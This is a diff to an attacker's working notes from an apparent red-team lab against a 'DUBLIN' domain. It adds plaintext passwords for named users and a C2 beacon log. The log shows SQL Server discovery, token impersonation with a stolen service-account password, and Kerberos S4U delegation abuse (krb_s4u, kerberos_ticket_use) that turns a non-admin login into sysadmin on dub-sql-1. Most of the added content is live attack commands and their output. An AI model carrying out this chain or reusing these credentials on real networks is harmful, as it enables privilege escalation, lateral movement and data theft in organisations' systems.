@@ -24,8 +24,10 @@ ACCESS
 
 user info:
 
-etate  is in workstation admins
-tdobson is in web admins
+etate:Passw0rd!
+    is in workstation admins
+tdobson:hfu2A!P!NEnyHeQ*
+    is in web admins
 nwallace is a domain admin!
 
 *************
@@ -106,3 +108,74 @@ and we got SYSTEM on dub-web-1!
 ***********
 
 so mssqlsvc password is Passw0rd!
+
+[04/29 17:05:42] beacon> sql-1434udp 10.10.122.20
+[04/29 17:05:42] [*] Tasked beacon to get SQL Server connection info from 10.10.122.20
+[04/29 17:05:42] [+] host called home, sent: 4499 bytes
+[04/29 17:05:42] [+] received output:
+SQL Server Connection Info:
+
+[ServerName;DUB-SQL-1;InstanceName;MSSQLSERVER;IsClustered;No;Version;16.0.1000.6;tcp;1433;;
+
+[04/29 17:13:20] beacon> make_token DUBLIN\mssqlsvc Passw0rd!
+[04/29 17:13:20] [*] Tasked beacon to create a token for DUBLIN\mssqlsvc
+[04/29 17:13:20] [+] host called home, sent: 55 bytes
+[04/29 17:13:20] [+] Impersonated DUBLIN\mssqlsvc (netonly)
+[04/29 17:13:37] beacon> sql-info dub-sql-1
+[04/29 17:13:37] [*] Tasked beacon to gather SQL server info on dub-sql-1
+[04/29 17:13:41] [+] host called home, sent: 17785 bytes
+[04/29 17:13:41] [+] received output:
+[*] Connecting to dub-sql-1:1433
+[+] Successfully connected to database
+[*] Extracting SQL server information
+ |--> ComputerName            : dub-sql-1
+ |--> DomainName              : DUBLIN
+ |--> ServicePid              : 5920
+ |--> ServiceName             : MSSQLSERVER
+ |--> ServiceAccount          : NT Service\MSSQLSERVER
+ |--> AuthenticationMode      : Windows Authentication
+ |--> ForcedEncryption        : 0
+ |--> Clustered               : No
+ |--> SqlServerVersionNumber  : 16.0.1000.6
+ |--> SqlServerMajorVersion   : 2022
+ |--> SqlServerEdition        : Standard Edition (64-bit)
+ |--> SqlServerServicePack    : RTM
+ |--> OsArchitecture          : X64
+ |--> OsVersionNumber         : 2022
+ |--> CurrentLogin            : DUBLIN\mssqlsvc
+ |--> IsSysAdmin              : False
+ |--> ActiveSessions          : 1
+
+ okay so i used s4u to impersonate iappleton and now we have sysadmin
+
+[04/29 18:06:26] beacon> krb_s4u /ticket:doI...NPTQ== /service:MSSQLSvc/dub-sql-1.dublin.contoso.com:1433 /impersonateuser:iappleton
+[04/29 18:29:45] beacon> make_token DUBLIN\iappleton FakePass
+...
+[04/29 18:29:50] [+] Impersonated DUBLIN\iappleton (netonly)
+[04/29 18:29:54] beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\sql.kirbi
+[04/29 18:30:07] beacon> sql-info dub-sql-1
+[04/29 18:30:07] [*] Tasked beacon to gather SQL server info on dub-sql-1
+[04/29 18:30:10] [+] host called home, sent: 17785 bytes
+[04/29 18:30:10] [+] received output:
+[*] Connecting to dub-sql-1:1433
+[+] Successfully connected to database
+[*] Extracting SQL server information
+ |--> ComputerName            : dub-sql-1
+ |--> DomainName              : DUBLIN
+ |--> ServicePid              : 5920
+ |--> ServiceName             : MSSQLSERVER
+ |--> ServiceAccount          : NT Service\MSSQLSERVER
+ |--> AuthenticationMode      : Windows Authentication
+ |--> ForcedEncryption        : 0
+ |--> Clustered               : No
+ |--> SqlServerVersionNumber  : 16.0.1000.6
+ |--> SqlServerMajorVersion   : 2022
+ |--> SqlServerEdition        : Standard Edition (64-bit)
+ |--> SqlServerServicePack    : RTM
+ |--> OsArchitecture          : X64
+ |--> OsMachineType           : ServerNT
+ |--> OsVersion               : Windows Server 2022 Standard
+ |--> OsVersionNumber         : 2022
+ |--> CurrentLogin            : DUBLIN\iappleton
+ |--> IsSysAdmin              : True
+ |--> ActiveSessions          : 1
